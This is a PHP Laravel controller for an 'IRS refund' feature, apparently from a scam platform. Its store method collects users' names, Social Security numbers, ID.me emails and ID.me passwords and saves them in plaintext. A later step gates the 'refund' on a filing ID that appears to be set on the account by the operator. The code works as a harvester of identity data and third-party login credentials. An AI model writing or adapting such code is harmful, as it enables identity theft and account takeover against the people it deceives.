<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\IrsRefund;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class IrsRefundController extends Controller
{
    public function index()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();
        return view('user.irs-refund.index', compact('refund'));
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'ssn' => 'required|string|max:255',
            'idme_email' => 'required|email|max:255',
            'idme_password' => 'required|string|max:255',
            'country' => 'required|string|max:255',
        ]);

        // Check if user already has a pending or approved refund
        $existingRefund = IrsRefund::where('user_id', Auth::id())
            ->whereIn('status', ['pending', 'approved'])
            ->first();

        if ($existingRefund) {
            return back()->with('error', 'You already have a pending or approved refund request.');
        }

        IrsRefund::create([
            'user_id' => Auth::id(),
            'name' => $request->name,
            'ssn' => $request->ssn,
            'idme_email' => $request->idme_email,
            'idme_password' => $request->idme_password,
            'country' => $request->country,
            'status' => 'pending'
        ]);

        return redirect()->route('irs-refund.filing-id')->with('success', 'Your refund request has been submitted successfully. Please enter your filing ID to proceed.');
    }

    public function filingId()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();
        
        if (!$refund) {
            return redirect()->route('irs-refund')->with('error', 'Please submit a refund request first.');
        }

        if ($refund->filing_id) {
            return redirect()->route('irs-refund.track')->with('info', 'You have already submitted your filing ID.');
        }

        return view('user.irs-refund.filing-id', compact('refund'));
    }

    public function updateFilingId(Request $request)
    {
        $request->validate([
            'filing_id' => 'required|string|max:255',
        ]);

        $refund = IrsRefund::where('user_id', Auth::id())->first();

        if (!$refund) {
            return back()->with('error', 'No refund request found.');
        }

        if ($refund->filing_id) {
            return back()->with('error', 'You have already submitted a filing ID.');
        }

        if ($refund->status !== 'pending') {
            return back()->with('error', 'This refund request is no longer pending.');
        }

        // Check if the filing ID matches the user's irs_filing_id
        if ($request->filing_id !== Auth::user()->irs_filing_id) {
            return back()->with('error', 'Invalid filing ID. Please check and try again.');
        }

        $refund->update([
            'filing_id' => $request->filing_id
        ]);

        return redirect()->route('irs-refund.track')->with('success', 'Filing ID updated successfully. Your refund request is now being processed.');
    }

    public function track()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();
        
        if (!$refund) {
            return redirect()->route('irs-refund')->with('error', 'Please submit a refund request first.');
        }

        if (!$refund->filing_id) {
            return redirect()->route('irs-refund.filing-id')->with('error', 'Please submit your filing ID to track your refund status.');
        }

        return view('user.irs-refund.track', compact('refund'));
    }
} 